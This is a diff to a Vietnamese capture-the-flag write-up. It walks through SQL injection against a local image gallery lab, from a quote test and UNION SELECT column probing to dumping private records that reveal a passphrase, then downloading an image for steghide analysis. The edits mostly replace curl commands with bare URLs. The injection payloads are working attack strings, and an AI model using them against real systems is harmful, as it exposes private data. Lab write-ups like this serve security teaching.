@@ -13,7 +13,7 @@ Trang chính hiển thị một số ảnh public. Mỗi ảnh dẫn tới endpo
 Thử một id không tồn tại:
 
 ```bash
-curl "http://127.0.0.1:8084/image?id=999"
+http://127.0.0.1:8084/image?id=999
 ```
 
 Trang trả về `No image`.
@@ -21,7 +21,7 @@ Trang trả về `No image`.
 ## 3. Thử lỗi quote SQL
 
 ```bash
-curl "http://127.0.0.1:8084/image?id=1'"
+http://127.0.0.1:8084/image?id=1'
 ```
 
 Nếu response có SQL error, có thể nghi ngờ tham số `id` được nối trực tiếp vào query.
@@ -31,7 +31,7 @@ Nếu response có SQL error, có thể nghi ngờ tham số `id` được nối
 Endpoint render ba trường: title, filename, description. Có thể thử `UNION SELECT` với 3 cột:
 
 ```bash
-curl "http://127.0.0.1:8084/image?id=-1' UNION SELECT 'a','b','c'--"
+http://127.0.0.1:8084/image?id=-1' UNION SELECT 'a','b','c'--
 ```
 
 Nếu trang hiển thị `a`, `b`, `c`, số cột là đúng.
@@ -41,7 +41,7 @@ Nếu trang hiển thị `a`, `b`, `c`, số cột là đúng.
 Tên bảng là `images` theo ngữ cảnh gallery. Query:
 
 ```bash
-curl "http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images--"
+http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images--
 ```
 
 Kết quả sẽ thấy nhiều ảnh, cả public và non-public.
@@ -49,7 +49,7 @@ Kết quả sẽ thấy nhiều ảnh, cả public và non-public.
 ## 6. Lọc ảnh private
 
 ```bash
-curl "http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images WHERE is_public=0--"
+http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images WHERE is_public=0--
 ```
 
 Trong response có record quan trọng:
@@ -63,7 +63,7 @@ passphrase: night-shift-713
 ## 7. Tải ảnh archive
 
 ```bash
-curl -o archive_713.jpg "http://127.0.0.1:8084/download?file=archive_713.jpg"
+http://127.0.0.1:8084/download?file=archive_713.jpg
 ```
 
 Ảnh xem bình thường, không có flag bằng `strings`.
@@ -73,7 +73,6 @@ curl -o archive_713.jpg "http://127.0.0.1:8084/download?file=archive_713.jpg"
 Cài tool trên Ubuntu:
 
 ```bash
-sudo apt update
 sudo apt install steghide
 ```
 
